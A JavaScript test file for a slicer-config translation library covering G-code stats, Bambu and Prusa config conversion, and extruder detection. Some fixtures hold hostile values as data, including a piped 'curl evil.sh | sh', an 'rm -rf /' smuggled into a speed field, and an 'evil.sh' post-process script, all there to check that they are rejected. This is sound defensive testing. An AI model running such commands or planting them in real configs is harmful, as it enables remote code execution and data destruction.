import { test } from "node:test";
import assert from "node:assert/strict";
import {
  fromBambuJson,
  fromPrusaIni,
  parseGcodeStats,
  usedExtruder,
} from "./lib.mjs";

test("parseGcodeStats reads the PrusaSlicer G-code footer", () => {
  const tail = [
    "; estimated printing time (normal mode) = 1d 2h 30m 10s",
    "; estimated printing time (silent mode) = 1d 4h 0m 0s", // ignored: first match wins
    "; filament used [mm] = 4321.5",
    "; total filament used [g] = 12.5,0.7", // multi-extruder values are summed
  ].join("\n");
  assert.deepEqual(parseGcodeStats(tail), {
    printTimeSeconds: 86400 + 2 * 3600 + 30 * 60 + 10,
    filamentGrams: 13.2,
    filamentMm: 4321.5,
  });
});

test("parseGcodeStats returns nulls when the footer has no stats", () => {
  assert.deepEqual(parseGcodeStats("G1 X10 Y10\n; some other comment"), {
    printTimeSeconds: null,
    filamentGrams: null,
    filamentMm: null,
  });
});

test("fromBambuJson translates known keys and drops everything else", () => {
  const derived = fromBambuJson(
    {
      layer_height: "0.2",
      wall_loops: "3",
      sparse_infill_density: "15%", // percent is allowed for fill_density
      sparse_infill_pattern: "zig-zag", // Bambu alias for rectilinear
      machine_max_speed_x: ["500", "200"], // [normal, silent] -> vector syntax
      nozzle_diameter: ["0.4"],
      filament_type: ["PLA", "PETG"],
      nozzle_temperature: ["220", "240"],
      post_process: "curl evil.sh | sh", // unknown key: never copied
      travel_speed: "350; rm -rf /", // known key, hostile value: rejected
    },
    2, // objects print with extruder 2 -> second filament entry
  );
  assert.deepEqual(derived, {
    layer_height: "0.2",
    perimeters: "3",
    fill_density: "15%",
    fill_pattern: "rectilinear",
    machine_max_speed_x: "500,200",
    nozzle_diameter: "0.4",
    filament_type: "PETG",
    temperature: "240",
  });
});

test("fromPrusaIni keeps only whitelisted keys", () => {
  const derived = fromPrusaIni(
    [
      "layer_height = 0.25",
      "perimeters = 2",
      "temperature = 215",
      "post_process = /bin/evil.sh", // must never survive into the derived config
      "print_host = 10.0.0.5",
      "output_filename_format = {input_filename_base}.gcode",
    ].join("\n"),
  );
  assert.deepEqual(derived, {
    layer_height: "0.25",
    perimeters: "2",
    temperature: "215",
  });
});

test("usedExtruder picks the majority assignment and defaults to 1", () => {
  const xml = `<config>
    <object><metadata key="extruder" value="2"/></object>
    <part><metadata key="extruder" value="2"/></part>
    <object><metadata key="extruder" value="1"/></object>
  </config>`;
  assert.equal(usedExtruder(xml), 2);
  assert.equal(usedExtruder(""), 1);
});
